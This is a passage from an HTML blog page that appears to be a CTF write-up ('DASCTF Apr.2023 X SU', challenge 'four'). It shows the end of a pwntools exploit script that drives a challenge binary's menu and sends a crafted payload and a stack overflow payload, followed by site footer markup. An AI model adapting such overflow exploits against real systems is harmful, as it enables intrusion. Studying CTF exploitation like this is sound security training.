mode:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter X:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter a string: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;please input filename&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x400EFB&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;output.txt&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Do you want to write data?&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;your choice : &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;info&gt;&gt;&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;&gt;:\x60\x21\x21&#x27;</span>+<span class="string">b&#x27;&gt;@a*&#x27;</span>+<span class="string">b&#x27;&gt;~3&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4010AE&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;your choice : &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;This is a strange overflow. Because of canary, you must not hijack the return address&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>+<span class="number">0x100</span>)+p64(<span class="number">0x602121</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x401457&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure>
+
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#four"><span class="toc-number">1.</span> <span class="toc-text">four</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/&text=DASCTF Apr.2023 X SU"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/&title=DASCTF Apr.2023 X SU"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/&is_video=false&description=DASCTF Apr.2023 X SU"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DASCTF Apr.2023 X SU&body=Check out this article: http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/&title=DASCTF Apr.2023 X SU"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/&title=DASCTF Apr.2023 X SU"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/&title=DASCTF Apr.2023 X SU"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/&title=DASCTF Apr.2023 X SU"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/&name=DASCTF Apr.2023 X SU&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/&t=DASCTF Apr.2023 X SU"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    C12en
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'c12en';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
